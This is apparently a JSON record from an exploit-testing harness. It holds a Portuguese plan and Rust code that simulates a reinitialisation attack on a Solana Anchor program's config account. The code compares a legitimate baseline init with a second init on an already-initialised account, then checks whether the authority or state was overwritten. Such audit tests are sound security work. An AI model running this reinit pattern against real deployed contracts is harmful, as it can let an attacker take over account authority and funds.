{
  "plan": "O cenário monta uma conta `config` já inicializada (com authority, is_initialized=true e vault_balance=0) e uma carteira authority. O baseline chama `init` legitimamente em uma conta nova, provando que o cenário está correto. O ataque chama `init` novamente na mesma conta já inicializada, tentando reinitializá-la. O efeito mede se a conta foi sobrescrita (ex.: authority alterada ou is_initialized permanece true com dados diferentes), demonstrando a reinitialização.",
  "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();

// Conta config já inicializada (estado anterior)
let config_data = anchor_account_data("Config", &(authority, true, 0u64));
let config_account = account(&env.program_id, &config_data, None);

// Carteira authority
let authority_account = wallet(1_000_000_000);

// System program
let (system_program_id, system_program_account) = system_program_account();

// Baseline: init em uma conta nova (legítimo)
let new_config_key = Pubkey::new_unique();
let new_config_account = empty_account();
let baseline_ix = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(new_config_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let baseline_accounts = vec![
    (new_config_key, new_config_account),
    (authority, authority_account.clone()),
    (system_program_id, system_program_account.clone()),
];
let baseline_result = env.baseline("init legítimo em conta nova", &baseline_ix, &baseline_accounts);

// Ataque: init na mesma conta já inicializada
let attack_ix = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let attack_accounts = vec![
    (config_key, config_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let attack_result = env.attack("reinit na conta já inicializada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_config = after(&attack_result, &config_key);
    let after_authority = read_pubkey(after_config.data(), 8);
    let after_is_init = after_config.data()[40] != 0;
    let after_vault = read_u64(after_config.data(), 41);
    env.effect(
        "conta reinitializada: authority sobrescrita ou estado alterado",
        after_authority != authority || !after_is_init || after_vault != 0,
    );
}"
}

